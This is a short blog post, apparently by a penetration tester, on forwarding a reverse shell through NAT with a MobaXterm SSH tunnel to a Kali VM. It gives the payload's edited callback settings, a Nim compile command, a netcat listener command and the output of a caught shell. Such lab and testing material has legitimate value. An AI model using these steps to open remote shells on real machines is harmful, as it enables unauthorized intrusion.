---
layout: post
title: Getting Shells Past NAT  
tags: [MobaX]
---

# Getting Shells Through NAT to Kali
I came across a situation where I needed to send a reverse shell to a Kali Linux VM that was not on the same network as the compromised machine. My Windows 10 (hosting the vm) workstation ***was*** on the same network as the compromised machine. One might say "well just change the VM configuration to be on bridged mode." This was not possible for a few reasons. 

I had to figure out a way to send a reverse shell to my Windows 10 machine and have it routed to my Kali VM. This is achieved by a Local Port Forward.

[MobaXterm](https://mobaxterm.mobatek.net/) is a terminal application that has a bunch of functions baked into it. One of those features is the tunnel feature. 

![MobaX](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/MobaXShells/img1.png)

We can create a new SSHTunnel that will send the reverse shell to my kali machine. The "Forwarded port" will be the port that the shell will connect to on Windows, in my case, it will be 9000. The SSH Server section is the IP address, username, and port that SSH is running on Kali. My Kali's IP was `192.168.1.10` and SSH was on 22. The "Remote Server & Port" will be the loopback address and what port kali will be listening on for the shell (9001)

![MobaX](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/MobaXShells/img2.png)

# Payload Configuration
When we configure our payload the IP will be our Windows 10 machine `10.10.10.5` and the port we want to connect to will be the forwarded port `9000`. When the payload is received by windows it will forward that traffic to our netcat listener on port `9001`

## Example
For this example, I will use a simple NIM [reverse shell](https://github.com/0xZon/Offensive-Nim/blob/main/revShell.nim)

I went and changed the two variables at the bottom to look like this
```
[snip]
let port = 9000

let listener = 10.10.10.5
[snip]
```

Compile it
```
nim c -d:mingw -d:strip --opt:size revShell.nim
```

Set up a listener on kali
```
nc -lvnp 9001
```

Transfer the executable over to the victim machine and execute it. Once it's running the shell will catch 
```
┌──(kali㉿kali)-[~/nim/windows]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34638
dir
 Volume in drive E is ssd
 Volume Serial Number is B214-E4A7

 Directory of E:\NIM

04/18/2022  08:11 PM    <DIR>          .
04/18/2022  08:11 PM    <DIR>          ..
04/18/2022  08:11 PM           145,920 revShell.exe
04/18/2022  08:08 PM           165,888 tcpReverseShell.exe
               2 File(s)        311,808 bytes
               2 Dir(s)  232,154,320,896 bytes free
```
